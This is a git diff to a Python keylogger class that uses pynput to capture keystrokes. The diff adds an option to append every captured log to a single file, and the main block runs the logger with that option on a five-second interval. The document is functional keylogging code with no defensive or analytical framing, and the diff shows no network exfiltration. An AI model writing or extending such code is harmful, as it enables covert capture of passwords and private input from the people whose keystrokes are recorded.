@@ -3,12 +3,14 @@ from threading import Timer
 from pynput.keyboard import Listener, Key
 
 class Keylogger:
-    def __init__(self, interval : int = 60, reportMethod : str = "file"):
+    def __init__(self, interval : int = 60, reportMethod : str = "file", onlyOneFile : bool = False):
         self.interval = interval
         self.reportMethod = reportMethod
         self.log = ""                           # Contains the log of all the keystrokes within `self.interval`
+        self.onlyOneFile = onlyOneFile
         self.startDatetime = datetime.now()
         self.endDatetime = datetime.now()
+        self.updateFilename()
 
     def callback(self, key : Key) -> None:
         """
@@ -33,7 +35,9 @@ class Keylogger:
         if self.log:
             # if there is something in log, report it
             self.endDatetime = datetime.now()
-            self.updateFilename()
+            
+            if not self.onlyOneFile:
+                self.updateFilename()
 
             if self.reportMethod == "file":
                 self.reportToFile()
@@ -50,7 +54,11 @@ class Keylogger:
             This method creates a log file in the current directory that contains
             the current keylogs in the `self.log` variable
         """
-        with open(f"{self.fileName}.txt", "w") as f:
+        mode = "w"
+        if self.onlyOneFile:
+            mode = "a"
+        
+        with open(f"{self.fileName}.txt", mode) as f:
             print(self.log, file=f)
         print(f"[+] Saved {self.fileName}.txt")
 
@@ -75,5 +83,6 @@ class Keylogger:
 if __name__ == "__main__":
     Keylogger(
         interval=5,
-        reportMethod="file"
+        reportMethod="file",
+        onlyOneFile=True
     ).start()
